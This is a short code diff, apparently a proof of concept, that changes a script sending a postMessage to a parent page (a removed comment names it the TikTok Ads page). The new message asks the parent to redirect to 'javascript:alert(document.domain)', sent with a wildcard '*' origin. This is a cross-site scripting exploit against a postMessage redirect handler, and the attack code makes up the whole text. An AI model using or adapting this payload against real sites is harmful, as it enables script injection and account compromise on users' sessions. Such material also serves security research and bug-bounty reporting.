@@ -1,7 +1,6 @@
 <script>
-// Send postMessage to the parent TikTok Ads page
 parent.postMessage({
-    action: "redirectAuth",
-    type: "TTAAPI" // You can try with "TTAAPI" or "CMAPI" too
+    action: "requestRedirectionTo",
+    targetUrlStr: "javascript:alert(document.domain)"
 }, "*");
 </script>
